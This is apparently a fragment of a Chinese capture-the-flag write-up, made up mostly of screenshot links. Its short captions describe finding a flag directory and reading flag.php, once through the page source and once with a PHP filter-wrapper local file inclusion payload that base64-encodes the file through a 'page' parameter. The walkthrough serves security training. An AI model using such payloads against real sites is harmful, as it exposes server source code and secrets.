![img](./assets/wps607.jpg)
![img](./assets/wps608.jpg)
![img](./assets/wps609.jpg)
![img](./assets/wps610.jpg)

得到

![img](./assets/wps611.jpg) 

路径

访问发现存在flag目录

![img](./assets/wps612.jpg) 

访问flag

发现存在flag.php

![img](./assets/wps613.jpg) 

读取

查看源码，得到flag

![img](./assets/wps614.jpg) 

或者利用php伪协议读取文件

构造payload：

![img](./assets/wps615.jpg) 

 

查看源码

/?page=php://filter/read=convert.base64-encode/

resource=s3chahahaDir/flag/flag.php

![img](./assets/wps616.jpg) 

解码得到flag

![img](./assets/wps617.jpg) 

 

 